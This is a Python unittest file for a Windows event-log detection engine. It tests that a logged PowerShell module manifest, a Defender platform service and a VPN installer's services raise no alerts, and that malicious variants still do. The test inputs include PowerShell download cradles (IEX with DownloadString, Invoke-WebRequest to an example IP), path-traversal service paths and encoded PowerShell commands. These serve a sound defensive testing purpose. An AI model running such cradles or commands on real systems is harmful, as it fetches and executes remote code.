"""Benign activity seen in a real Windows 11 workstation's own logs.

Both cases came from running the engine on an ordinary laptop's Application,
System and PowerShell logs, where they produced critical findings.
"""

import unittest
from datetime import datetime, timezone

from detectors import persistence, powershell_script
from tests.test_regressions import make_event

_TS = datetime(2026, 10, 23, 5, 17, 48, tzinfo=timezone.utc)

# Shape of Microsoft.PowerShell.Utility.psd1 as logged in event 4104 (abridged).
UTILITY_MANIFEST = """@{
GUID = "1DA87E53-152B-403E-98DC-74D7B4D63D59"
Author = "PowerShell"
CompanyName = "Microsoft Corporation"
ModuleVersion = "7.0.0.0"
CompatiblePSEditions = @("Core")
PowerShellVersion = "3.0"
CmdletsToExport = @(
  'Export-Alias', 'Get-Alias', 'Invoke-RestMethod', 'Add-Type',
  'Write-Warning', 'Invoke-WebRequest', 'Format-Wide'
)
FunctionsToExport = @()
AliasesToExport = @('fhx')
NestedModules = @("Microsoft.PowerShell.Commands.Utility.dll")
HelpInfoURI = 'https://aka.ms/powershell75-help'
}

# SIG # Begin signature block
# MIInKwYJKoZIhvcNAQcCoIInHDCCJxgCAQExDzANBglghkgBZQMEAgEFADB5Bgor
# SIG # End signature block
"""


def _script_block(text):
    return make_event(
        4104, timestamp=_TS, computer="workstation",
        channel="Microsoft-Windows-PowerShell/Operational", provider="Microsoft-Windows-PowerShell",
        event_data={"ScriptBlockId": "block-1", "ScriptBlockText": text},
    )


def _service(name, image_path):
    return make_event(
        7045, timestamp=_TS, computer="workstation", channel="System", provider="Service Control Manager",
        event_data={"ServiceName": name, "ImagePath": image_path, "ServiceAccount": "LocalSystem"},
    )


def _rules(alerts):
    return {alert.rule_name for alert in alerts}


class ModuleManifestTests(unittest.TestCase):
    def test_logged_module_manifest_is_not_a_download_cradle(self):
        alerts = powershell_script.detect([_script_block(UTILITY_MANIFEST)])
        self.assertNotIn("PowerShell Download Cradle", _rules(alerts))

    def test_manifest_with_command_value_still_alerts(self):
        text = "@{\nModuleVersion = '1.0'\nPayload = Invoke-WebRequest 'http://198.51.100.7/a.ps1'\n}"
        self.assertIn("PowerShell Download Cradle", _rules(powershell_script.detect([_script_block(text)])))

    def test_manifest_with_subexpression_in_string_still_alerts(self):
        text = "@{\nModuleVersion = '1.0'\nNote = \"$(iex (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a'))\"\n}"
        self.assertIn("PowerShell Download Cradle", _rules(powershell_script.detect([_script_block(text)])))

    def test_manifest_followed_by_code_still_alerts(self):
        text = UTILITY_MANIFEST.split("# SIG #")[0] + "\nIEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')\n"
        self.assertIn("PowerShell Download Cradle", _rules(powershell_script.detect([_script_block(text)])))

    def test_hashtable_without_module_version_is_not_exempt(self):
        text = "@{\nUri = 'http://198.51.100.7/a'\nCmd = 'Invoke-WebRequest'\n}"
        self.assertIn("PowerShell Download Cradle", _rules(powershell_script.detect([_script_block(text)])))


class DefenderPlatformServiceTests(unittest.TestCase):
    CORE = r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpDefenderCoreService.exe"'

    def test_defender_platform_update_service_is_not_alerted(self):
        self.assertEqual(persistence.detect([_service("Microsoft Defender Core Service", self.CORE)]), [])

    def test_other_service_name_with_defender_binary_alerts(self):
        alerts = persistence.detect([_service("Updater", self.CORE)])
        self.assertIn("Service Installed", _rules(alerts))

    def test_defender_name_with_mismatched_binary_alerts(self):
        path = self.CORE.replace("MpDefenderCoreService.exe", "MsMpEng.exe")
        self.assertIn("Service Installed", _rules(persistence.detect([_service("Microsoft Defender Core Service", path)])))

    def test_defender_name_outside_platform_folder_alerts(self):
        for path in (r"C:\Users\Public\MpDefenderCoreService.exe",
                     r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1.2-0\..\..\..\..\Temp\MpDefenderCoreService.exe"',
                     self.CORE + " --payload"):
            with self.subTest(path=path):
                alerts = persistence.detect([_service("Microsoft Defender Core Service", path)])
                self.assertIn("Service Installed", _rules(alerts))
                self.assertIn("Suspicious Service Execution", _rules(alerts))


class InstallerServiceClusterTests(unittest.TestCase):
    """Real case: a VPN installer registered three services within nine minutes."""

    def _incidents(self, images):
        from correlation.attack_chain import correlate
        from correlation.incident_builder import build_incidents
        from triage_engine.adapters import alerts_to_signals_findings
        from datetime import timedelta
        events = [make_event(7045, timestamp=_TS + timedelta(minutes=4 * index), computer="workstation",
                             channel="System", provider="Service Control Manager",
                             event_data={"ServiceName": f"VendorSvc{index}", "ImagePath": image,
                                         "ServiceAccount": "LocalSystem"})
                  for index, image in enumerate(images)]
        alerts = persistence.detect(events)
        signals, findings, _ = alerts_to_signals_findings(alerts)
        return findings, build_incidents(events, signals, findings, correlate(alerts))

    def test_routine_service_installs_close_in_time_are_not_an_attack_chain(self):
        findings, incidents = self._incidents([
            r'"C:\Program Files\Vendor\VPN\v5.1.8\VendorService.exe"',
            r'\??\C:\Program Files\Vendor\VPN\v5.1.8\Resources\Vendor.CalloutDriver.sys',
            r'"C:\Program Files\Vendor\VPN\v5.1.8\Vendor.WireGuardService.exe"'])
        self.assertEqual(findings, [])
        self.assertEqual(incidents, [])

    def test_suspicious_service_installs_still_form_an_incident(self):
        findings, incidents = self._incidents([
            r"C:\Users\Public\a.exe", r"cmd.exe /c C:\Users\Public\b.bat", r"powershell -enc AAAA"])
        self.assertTrue(findings)
        self.assertTrue(incidents)


if __name__ == "__main__":
    unittest.main()
